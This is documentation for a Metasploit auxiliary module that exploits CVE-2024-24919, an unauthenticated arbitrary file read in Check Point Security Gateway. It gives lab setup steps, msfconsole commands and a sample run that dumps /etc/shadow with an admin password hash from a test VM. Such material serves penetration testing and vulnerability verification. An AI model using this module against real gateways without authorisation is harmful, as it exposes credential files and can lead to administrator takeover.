## Vulnerable Application
This module leverages an unauthenticated arbitrary root file read vulnerability for
Check Point Security Gateway appliances. When the IPSec VPN or Mobile Access blades
are enabled on affected devices, traversal payloads can be used to read any files on
the local file system. Password hashes read from disk may be cracked, potentially
resulting in administrator-level access to the target device. This vulnerability is
tracked as CVE-2024-24919.

## Options

### STORE_LOOT
Whether the read file's contents should be outputted to the console or stored as loot (default: false).

### TARGETFILE
The target file to read (default: /etc/shadow). This should be a full Linux file path. Files containing binary data may
not be read accurately.

## Testing
To set up a test environment:
1. Download an affected version of Check Point Security Gateway (Such as Check_Point_R81.20_T631.iso, SHA1:
42e25f45ab6b1694a97f76ca363d58040802e6d6).
1. Install the ISO within a virtual machine.
1. Browse to the administrator web dashboard on port 443 and complete the first-time setup tasks.
1. On a Windows system, download and install a copy of Check Point SmartConsole, then use it to authenticate to Security Gateway.
1. In SmartConsole, enable and configure the vulnerable Mobile Access or IPSec VPN blades. These instructions focus on Mobile Access:
   1. Open the Gateway Properties:
      1. Navigate to Gateways & Servers in the left-hand menu.
      1. Select the gateway you want to configure.
      1. Right-click on the gateway and select Edit.
   1. Enable Mobile Access:
      1. In the General Properties tab, under Network Security, check the box for Mobile Access.
      1. Click on Mobile Access in the left-hand menu of the gateway properties window to access the Mobile Access settings.
   1. Configure Mobile Access:
      1. Set up the authentication methods under Authentication (e.g., LDAP, RADIUS, etc.).
      1. Configure the Portal Settings, specifying the URL for the Mobile Access Portal.
      1. Under Applications, define which applications and resources will be accessible via the Mobile Access portal.
      1. Click OK to close the properties window.
1. Publish and push the configuration changes to the device.
   1. In SmartConsole, after completing your configuration, click on the Publish button at the top right corner of the
      SmartConsole window. This will save your changes to the management database.
   1. After publishing the changes, click on the Install Policy button located at the top of the SmartConsole window.
   1. In the Install Policy window, select the policy package you want to install. This is typically your main security policy package.
   1. Choose the gateways on which you want to install the policy. Make sure to select the gateway that you configured
      for Mobile Access and/or IPSec VPN.
   1. Click Install to begin the installation process. Once this process completes the gateway should then be vulnerable to this module.


## Verification Steps
1. Start msfconsole
2. `use auxiliary/gather/checkpoint_gateway_fileread_cve_2024_24919`
3. `set RHOSTS <TARGET_IP_ADDRESS>`
4. `set RPORT <TARGET_PORT>`
5. `set TARGETFILE <TARGET_FILE_TO_READ>`
6. `set STORE_LOOT false` if you want to display the target file on the console instead of storing it as loot.
7. `run`

## Scenarios
### Check Point Security Gateway Linux
```
msf6 auxiliary(gather/checkpoint_gateway_fileread_cve_2024_24919) > show options 

Module options (auxiliary/gather/checkpoint_gateway_fileread_cve_2024_24919):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT       443              yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   STORE_LOOT  false            yes       Store the target file as loot
   TARGETFILE  /etc/shadow      yes       The target file to read. This should be a full Linux file path. Files containing binary data may not be read accurately
   TARGETURI   /                yes       The URI path to Check Point Security Gateway
   VHOST                        no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf6 auxiliary(gather/checkpoint_gateway_fileread_cve_2024_24919) > set RHOSTS 192.168.181.128
RHOSTS => 192.168.181.128
msf6 auxiliary(gather/checkpoint_gateway_fileread_cve_2024_24919) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf6 auxiliary(gather/checkpoint_gateway_fileread_cve_2024_24919) > check
[+] 192.168.181.128:443 - The target is vulnerable. Arbitrary file read successful!
msf6 auxiliary(gather/checkpoint_gateway_fileread_cve_2024_24919) > run
[*] Running module against 192.168.181.128

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Arbitrary file read successful!
[+] File read succeeded! 
admin:$6$hHJHiZdC2kHPD5HQ$/0dtMC53GSaZpLA/MeChOvJNNE4i9qoKL57Dsl853wF/RRNzJJ6CO5/qBmzCM7KdEUmXanF3J8T50ppLh/Sf2/:14559:0:99999:8:::
monitor:*:19872:0:99999:8:::
root:*:19872:0:99999:7:::
cp_routeevt:*:19872:0:99999:7:::
nobody:*:19872:0:99999:7:::
postfix:*:19872:0:99999:7:::
rpm:!!:19872:0:99999:7:::
shutdown:*:19872:0:99999:7:::
pcap:!!:19872:0:99999:7:::
halt:*:19872:0:99999:7:::
cp_postgres:*:19872:0:99999:7:::
cp_extensions:*:19872:0:99999:7:::
cpep_user:*:19872:0:99999:7:::
vcsa:!!:19872:0:99999:7:::
_nonlocl:*:19872:0:99999:7:::
sshd:*:19872:0:99999:7:::

[*] Auxiliary module execution completed
```
